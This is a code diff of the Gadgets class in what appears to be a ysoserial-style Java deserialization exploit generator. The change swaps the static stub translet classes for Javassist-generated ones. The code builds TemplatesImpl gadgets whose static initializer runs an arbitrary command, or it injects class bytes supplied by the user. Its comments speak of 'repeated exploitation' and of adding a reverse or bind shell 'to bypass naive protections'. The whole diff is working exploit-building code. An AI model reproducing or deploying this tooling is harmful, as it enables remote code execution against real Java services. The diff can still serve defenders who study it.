@@ -40,24 +40,6 @@ public class Gadgets {
 
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
 
-    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
-
-        private static final long serialVersionUID = -5971610431559700674L;
-
-
-        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}
-
-
-        @Override
-        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
-    }
-
-    // required to make TemplatesImpl happy
-    public static class Foo implements Serializable {
-
-        private static final long serialVersionUID = 8207363842866235160L;
-    }
-
 
     public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
         return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
@@ -107,6 +89,7 @@ public class Gadgets {
             throws Exception {
         final T templates = tplClass.newInstance();
         byte[] classBytes = null;
+        ClassPool pool = ClassPool.getDefault();
 
         if(command.toLowerCase().startsWith(CustomCommand.COMMAND_CLASS_FILE)){
             classBytes = CommonUtil.readFileByte(command.substring(CustomCommand.COMMAND_CLASS_FILE.length()));
@@ -114,25 +97,31 @@ public class Gadgets {
             classBytes = new BASE64Decoder().decodeBuffer(command.substring(CustomCommand.COMMAND_CLASS_BASE64.length()));
         } else {
             // use template gadget class
-            ClassPool pool = ClassPool.getDefault();
-            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
             pool.insertClassPath(new ClassClassPath(abstTranslet));
-            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+
             // run command in static initializer
             // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
             String cmd = TemplatesImplUtil.getCmd(command);
+            //final CtClass clazz = pool.get(StubTransletPayload.class.getName());
+            final CtClass clazz = pool.makeClass("T" + System.nanoTime());
             clazz.makeClassInitializer().insertAfter(cmd);
             // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
-            clazz.setName("T" + System.nanoTime());
             CtClass superC = pool.get(abstTranslet.getName());
             clazz.setSuperclass(superC);
-            //clazz.writeFile("./");
+            CtClass clsSerializable = pool.get("java.io.Serializable");
+            clazz.setInterfaces(new CtClass[]{clsSerializable});
+            clazz.addField(CtField.make("private static final long serialVersionUID = -5971610431559700674L;", clazz));
+            clazz.writeFile("./");
             classBytes = clazz.toBytecode();
         }
 
         // inject class bytes into instance
+        final CtClass foo = pool.makeClass("Foo");
+        CtClass clsSerializable = pool.get("java.io.Serializable");
+        foo.setInterfaces(new CtClass[]{clsSerializable});
+        foo.addField(CtField.make("private static final long serialVersionUID = 8207363842866235160L;", foo));
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
-            classBytes, ClassFiles.classAsBytes(Foo.class)
+            classBytes, foo.toBytecode()
         });
 
         // required to make TemplatesImpl happy
@@ -153,7 +142,7 @@ public class Gadgets {
         } else {
             ClassPool classPool = ClassPool.getDefault();
             classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
-            CtClass clazz = classPool.makeClass("C" + System.nanoTime());
+            CtClass clazz = classPool.makeClass("C");
             String code = TemplatesImplUtil.getCmd(command);
             clazz.makeClassInitializer().insertAfter(code);
             CtClass superC = classPool.get(AbstractTranslet.class.getName());
